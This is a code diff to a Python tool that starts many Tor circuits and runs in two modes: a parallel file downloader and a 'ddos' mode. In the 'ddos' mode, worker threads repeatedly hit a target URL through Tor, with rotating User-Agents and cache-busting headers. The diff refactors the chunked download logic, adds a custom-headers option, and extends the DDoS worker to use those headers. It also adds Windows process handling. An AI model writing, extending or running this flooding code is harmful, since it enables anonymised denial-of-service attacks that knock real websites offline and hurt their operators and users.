@@ -3,7 +3,9 @@
 
 import os
 import sys
+import traceback
 import argparse
+import json
 import subprocess
 import threading
 import signal
@@ -23,24 +25,26 @@ requests.packages.urllib3.disable_warnings()
 
 KILL_RECEIVED = False
 
-MODE = None
-N_CIRCUITS = None
-DEBUG_OUTPUT = None
-TMP_DIR = None
-CHANGE_CIRCUITS = None
-PORT_START = None
-TOR_BINARY = None
-CHUNK_SIZE = None
-OUTPUT_DIR = None
-MAX_ATTEMPTS = None
+MODE: str = None
+N_CIRCUITS: int = None
+DEBUG_OUTPUT: bool = None
+TMP_DIR: os.PathLike = None
+CHANGE_CIRCUITS: bool = None
+PORT_START: int = None
+TOR_BINARY: os.PathLike = None
+CHUNK_SIZE: int = None
+OUTPUT_DIR: os.PathLike = None
+MAX_ATTEMPTS: int = None
+CHUNKING: bool = False
+HEADERS: dict = None
 
-TARGET_LIST = None
+TARGET_LIST: list = None
 
-WORKER_STRUCT_SKEL = {
+WORKER_STRUCT_SKEL: dict = {
     "thread": None, # worker Thread (threading.Thread)
     "index": None,  # Local thread index
     "state": None,  # Worker state
-    "done": None,   # Must end
+    "done": False,  # Must end
     "control_port": None,   # Tor Control port
     "socks_port": None,     # Tor Socks port
     "tor_process": None,    # Tor Process (subprocess.Popen)
@@ -50,10 +54,10 @@ WORKER_STRUCT_SKEL = {
         "acum_req": 0,
     }
 }
-WORKER_STRUCTS_ARR = []
+WORKER_STRUCTS_ARR: list = []
 
-TASK_QUEUE = None
-TARGET_CHUNK_LIST = {}
+TASK_QUEUE: queue.Queue = None
+TARGET_CHUNK_LIST: dict = {}
 
 # Output
 
@@ -105,7 +109,7 @@ class Style():
     GREENBG2  = '\33[102m'
     YELLOWBG2 = '\33[103m'
     BLUEBG2   = '\33[104m'
-    VOLETBG2 = '\33[105m'
+    VIOLETBG2 = '\33[105m'
     BEIGEBG2  = '\33[106m'
     WHITEBG2  = '\33[107m'
 
@@ -159,52 +163,108 @@ def get_size(worker_struct, file_url):
     size = int(response.headers['Content-Length'])
     return size
 
-def download_chunk(worker_struct, task):
+def chunk(worker_struct, task, output_file, parsed):
+    worker_struct["state"] = "chunking"
+    file_size = get_size(worker_struct, task["url"])
+    if file_size is None: # Could not get file size (timeout, connection error...)
+        task["attempts"] += 1
+        if task["attempts"] >= MAX_ATTEMPTS:
+            print(Style.RED + "Max Attempts reached:" + Style.END, "Could not get file size of", task["url"])
+        else:
+            print(Style.YELLOW + "Failed attempt " + str(task["attempts"]) + ":" + Style.END + " Could not get file size of", task["url"])
+            # Add task to the queue again
+            add_task_queue(task)
+            # Change circuit
+            change_circuit(worker_struct)
+        return
+
+    chunks = range(0, file_size, CHUNK_SIZE)
+    for i, start in enumerate(chunks):
+        chunk_file = output_file + ".chunk" + str(i) + "_" + str(CHUNK_SIZE) + ".storm"
+        chunk_task = {
+            "type": "chunk",
+            "url": task["url"],
+            "init_byte": start,
+            "end_byte": min(start + CHUNK_SIZE - 1, file_size),
+            "save_as": chunk_file,
+            "file_size": file_size,
+            "attempts": 0,
+            "status": "queued",
+        }
+        # Check if it already exists
+        if os.path.exists(chunk_file) and os.path.isfile(chunk_file):
+            # TODO: check if it's the expected size
+            print("Chunk already downloaded:", chunk_file)
+            chunk_task["status"] = "downloaded"
+        else:
+            add_task_queue(chunk_task)
+        
+        if parsed.path not in TARGET_CHUNK_LIST:
+            TARGET_CHUNK_LIST[parsed.path] = []
+        TARGET_CHUNK_LIST[parsed.path].append(chunk_task)
+
+def download_task(worker_struct, task):
     worker_struct["state"] = "downloading"
     task["status"] = "downloading"
-
-    # Get task info
-    url = task["url"]
-    start = task["init_byte"]
-    end = task["end_byte"]
-    output = task["save_as"]
     
-    print("Downloading chunk", output)
+    print("Downloading file" + (" chunk" if task["type"] == "chunk" else "") + " from URL", task["save_as"])
+    
+    response = None
+    error = None
     try:
+        headers = HEADERS
+        if task["type"] == "chunk":
+            headers['Range'] = f'bytes={task["init_byte"]}-{task["end_byte"]}' 
         response = requests.get(
-            url,
+            task["url"],
             proxies = {
                 'http': 'socks5h://localhost:'+str(worker_struct["socks_port"]),
                 'https': 'socks5h://localhost:'+str(worker_struct["socks_port"])
             },
-            headers = {'Range': f'bytes={start}-{end}'},
+            headers = headers,
         )
     except (requests.exceptions.ConnectionError,
         requests.exceptions.ConnectTimeout,
         urllib3.connectionpool.TimeoutError,
         urllib3.connectionpool.MaxRetryError,
         ) as e:
-        task["attempts"] += 1
-        if task["attempts"] >= MAX_ATTEMPTS:
-            print(Style.RED + "Max Attempts reached:" + Style.END, "Could not download file chunk from", task["url"])
-        else:
-            print(Style.YELLOW + "Failed attempt " + str(task["attempts"]) + ":" + + Style.END + " Could not download file chunk from", task["url"])
-            # Add task to the queue again
-            add_task_queue(task)
-            # Delay to avoid picking it again if happens to be the last task
-            time.sleep(5) # Same delay as wait when found queue empty
-        return
-    if response.status_code == 200 or response.status_code == 206: # OK or Partial Content
+        response = None
+        error = str(type(e).__name__)
+
+    if response and (response.status_code == 200 or (task["type"] == "chunk" and response.status_code == 206)): # OK or Partial Content
         task["status"] = "downloaded"
-        print("Chunk downloaded successfully")
+        print(Style.GREEN + "Downloaded file" + (" chunk" if task["type"] == "chunk" else "") + " successfully:" + Style.END, task["save_as"])
         # Save chunk
-        f = open(output, 'wb')
+        f = open(task["save_as"], 'wb')
         for part in response.iter_content(1024):
             f.write(part)
         f.close()
-    else:
-        task["status"] = str(response.status_code)[:1]
-        task["status"] = "error"
+    
+    elif response and response.status_code == 404:
+        task["status"] = "not_found"
+        print(Style.YELLOW + "Failed download:" + Style.END + "File" + (" chunk" if task["type"] == "chunk" else "") + " not found (HTTP 404):", task["url"])
+
+    else: # no response (connection error/timeout) or wrong status code
+        if response is not None:
+            error = "HTTP " + str(response.status_code) + ": " + str(response.reason)
+
+        if not error:
+            error = "Unknown error"
+        
+        task["attempts"] += 1
+        if task["attempts"] >= MAX_ATTEMPTS:
+            task["status"] = "error_max_attempts"
+            print(Style.RED + "Max Attempts reached:" + Style.END, "Could not download file" + (" chunk" if task["type"] == "chunk" else "") + " from", task["url"])
+        else:
+            task["status"] = "retry"
+            print(Style.YELLOW + "Failed attempt " + str(task["attempts"]) + " (" + error + "):" + Style.END + " Could not download file" + (" chunk" if task["type"] == "chunk" else "") + " from", task["url"])
+            # Add task to the queue again
+            add_task_queue(task)
+            # Delay to avoid picking it again if happens to be the last task
+            if TASK_QUEUE.qsize() < max(5, N_CIRCUITS):
+                print("Queue is almost empty! Waiting 5 seconds to avoid picking this same task...")
+                time.sleep(5) # Same delay as wait when found queue empty
+        return
 
 def download_worker(worker_struct):
     while True:
@@ -224,57 +284,24 @@ def download_worker(worker_struct):
             continue
         if not task:
             continue
+        # Output file
+        parsed = urlparse(task["url"])
+        output_file = OUTPUT_DIR + parsed.path
+        # Type
+        if task["type"] == "file":
+            # Output file
+            task["save_as"] = output_file
+            # Download whole file
+            os.makedirs(os.path.dirname(output_file), exist_ok=True)
+            download_task(worker_struct, task)
         if task["type"] == "chunk":
             # Download chunk
-            download_chunk(worker_struct, task)
-        elif task["type"] == "file":
-            # Calculate chunks and add to queue
-            print("Got unchunked target:", task["url"])
-            worker_struct["state"] = "chunking"
-            # Output file
-            parsed = urlparse(task["url"])
-            output_file = OUTPUT_DIR + parsed.path
             os.makedirs(os.path.dirname(output_file), exist_ok=True)
-            # Chunk
-            file_size = get_size(worker_struct, task["url"])
-            if file_size is None: # Could not get file size (timeout, connection error...)
-                task["attempts"] += 1
-                if task["attempts"] >= MAX_ATTEMPTS:
-                    print(Style.RED + "Max Attempts reached:" + Style.END, "Could not get file size of", task["url"])
-                else:
-                    print(Style.YELLOW + "Failed attempt " + str(task["attempts"]) + ":" + Style.END + " Could not get file size of", task["url"])
-                    # Add task to the queue again
-                    add_task_queue(task)
-                    # Change circuit
-                    change_circuit(worker_struct)
-                    
-                    # TODO : Delay to avoid picking it again if happens to be the last task
-                    # time.sleep(5) # Same delay as wait when found queue empty
-
-                continue
-            chunks = range(0, file_size, CHUNK_SIZE)
-            for i, start in enumerate(chunks):
-                chunk_file = output_file + ".chunk" + str(i) + "_" + str(CHUNK_SIZE) + ".storm"
-                chunk_task = {
-                        "type": "chunk",
-                        "url": task["url"],
-                        "init_byte": start,
-                        "end_byte": min(start + CHUNK_SIZE - 1, file_size),
-                        "save_as": chunk_file,
-                        "file_size": file_size,
-                        "attempts": 0,
-                        "status": "queued",
-                    }
-                # Check if it already exists
-                if os.path.exists(chunk_file) and os.path.isfile(chunk_file):
-                    print("Chunk already downloaded:", chunk_file)
-                    chunk_task["status"] = "downloaded"
-                else:
-                    add_task_queue(chunk_task)
-                
-                if parsed.path not in TARGET_CHUNK_LIST:
-                    TARGET_CHUNK_LIST[parsed.path] = []
-                TARGET_CHUNK_LIST[parsed.path].append(chunk_task)
+            download_task(worker_struct, task)
+        elif task["type"] == "must_chunk":
+            print("Got unchunked target:", task["url"])
+            # Calculate chunks and add to queue
+            chunk(worker_struct, task, output_file, parsed)
 
 # Worker DDoS mode
 
@@ -319,6 +346,14 @@ def ddos_worker(worker_struct):
         if worker_struct["done"]:
             return
         try:
+            headers = HEADERS
+            if not "User-Agent" in headers:
+                headers["User-Agent"] = user_agents[count % len(user_agents)]
+            if not "Accept-Language" in headers:
+                headers["Accept-Language"] = "en-us,en;q=0.5"
+            if not "Cache-Control" in headers:
+                headers["Cache-Control"] = "no-store, no-cache"
+            
             # TODO : Make it Async
             response = requests.get(
                 url,
@@ -326,11 +361,8 @@ def ddos_worker(worker_struct):
                     'http': 'socks5h://localhost:'+str(worker_struct["socks_port"]), # '5' -> DNS res. on client. '5h' -> DNS res. on proxy.
                     'https': 'socks5h://localhost:'+str(worker_struct["socks_port"])
                 },
-                headers = {
-                    "User-Agent": user_agents[count % len(user_agents)],
-                    "Accept-Language": "en-us,en;q=0.5",
-                    "Cache-Control": "no-store, no-cache",
-                },
+                
+                headers = headers,
                 hooks={"response": request_response_hook},
                 timeout=90)
             count += 1
@@ -361,7 +393,12 @@ def ddos_worker(worker_struct):
 
 def killall_tor():
     print("Killing all Tor processes...")
-    os.system('killall tor 1>/dev/null 2>&1')
+    if os.name == 'nt':
+        os.system('taskkill /IM tor.exe /F 1>nul 2>&1')
+    elif os.name == 'posix':
+        os.system('killall tor 1>/dev/null 2>&1')
+    else:
+        print("Could not kill Tor processes: Unknown OS")
 
 def worker_kill_tor(worker_struct):
     print("Killing Tor process...")
@@ -547,14 +584,20 @@ def worker(worker_struct):
             if worker_struct["done"]:
                 break
             else:
-                print(Style.RED + "Error on job:" + Style.END, e)
+                exc_type, exc_value, exc_traceback = sys.exc_info()
+
+                print(Style.RED + "Unexpected error on job: " + Style.END + exc_type.__name__ + ": " + str(exc_value))
+                print(Style.RED + "Traceback:" + Style.END)
+                traceback.print_tb(exc_traceback)
+                
+                # kill Tor process
                 worker_kill_tor(worker_struct)
             # Start over
             print ("Wait one second before retrying...")
             time.sleep(1)
             continue
     if worker_struct["done"]:
-        print(Style.VOLETBG2 + Style.BOLD + Style.WHITE + " The End is Nigh " + Style.END)
+        print(Style.VIOLETBG2 + Style.BOLD + Style.WHITE + " The End is Nigh " + Style.END)
     # stop the Tor process
     worker_die(worker_struct)
 
@@ -639,14 +682,24 @@ def setup_tasks_queue():
     TASK_QUEUE = queue.Queue() # A thread-safe queue
     # Fill queue with tasks
     for t in TARGET_LIST:
-        add_task_queue({
-            "type": "file",
-            "url": t,
-            "file_size": None,
-            "attempts": 0,
-            "status": "queued",
-        })
-    
+
+        if CHUNKING:
+            add_task_queue({
+                "type": "must_chunk",
+                "url": t,
+                "file_size": None,
+                "attempts": 0,
+                "status": "queued",
+            })
+        else:
+            add_task_queue({
+                "type": "file",
+                "url": t,
+                "file_size": None,
+                "attempts": 0,
+                "status": "queued",
+            })
+
 def main():
     # signals
     signal.signal(signal.SIGINT, kill_handler)
@@ -718,7 +771,10 @@ def main():
         
         if not DEBUG_OUTPUT:
             # Worker Stats
-            os.system('clear')
+            if os.name == 'nt':
+                os.system('cls')
+            else:
+                os.system('clear')
             header()
             stats()
         
@@ -749,6 +805,7 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--port-start',   type=int,   help='Number of concurrent circuits to establish', default=9050)
     parser.add_argument('-T', '--tor-bin',      type=str,   help='Tor binary path', default='/usr/bin/tor')
     parser.add_argument('-D', '--debug',                    help='Print debugger messages', action='store_true')
+    parser.add_argument('-H', '--headers',      type=str,   help='Headers JSON file', default=None)
     
     subparsers = parser.add_subparsers(title='mode', dest='mode', help='mode', required=True)
 
@@ -766,9 +823,7 @@ if __name__ == '__main__':
     downloader_parser.add_argument('-o', '--output-dir',    type=str, help='Where the downloaded files are saved', default=os.path.join(os.getcwd(), "data"))
     downloader_parser.add_argument('-s', '--chunk-size',    type=int, help='Size (in bytes) of the download chunks', default=1024*1024)
     downloader_parser.add_argument('-m', '--max-attempts',  type=int, help='Max number of attempts to download a file', default=5)
-
-    # index discover mode arguments
-    # discover_parser = subparsers.add_parser('disc', help='File discover mode')
+    downloader_parser.add_argument('-c', '--chunking',      help='Download files by chunks. HTTP server must accept HEAD method.', action='store_true')
 
     # parse args
     args = parser.parse_args()
@@ -781,24 +836,37 @@ if __name__ == '__main__':
     CHANGE_CIRCUITS = args.change_circuits
     PORT_START = args.port_start
     TOR_BINARY = args.tor_bin
+    HEADERS = json.load(open(args.headers)) if args.headers else None
 
     # download
     if MODE == "down":
         CHUNK_SIZE = args.chunk_size
         OUTPUT_DIR = args.output_dir
         MAX_ATTEMPTS = args.max_attempts
+        CHUNKING = args.chunking
 
     # ddos / download
     if MODE == "ddos" or MODE == "down":
+
+        aux_target_list = []
+
         if args.target_url:
-            TARGET_LIST = [args.target_url]
+            aux_target_list = [args.target_url]
         elif args.targets_list:
-            TARGET_LIST = args.targets_list.split(',')
+            aux_target_list = args.targets_list.split(',')
         elif args.targets_file:
-            TARGET_LIST = [l for l in open(args.targets_file, 'r').readlines() if l.strip()]
+            aux_target_list = [l for l in open(args.targets_file, 'r').readlines() if l]
         else:
             __builtin__.print("Error: no target specified.")
             parser.print_usage()
             exit(1)
+        
+        def unique(seq):
+            seen = set()
+            seen_add = seen.add
+            return [x for x in seq if not (x in seen or seen_add(x))]
+        
+        aux_target_list_2 = unique([t.replace("\t", "").replace("\n", "").replace("\r", "").strip() for t in aux_target_list])
+        TARGET_LIST = [t for t in aux_target_list_2 if t]
 
     main()
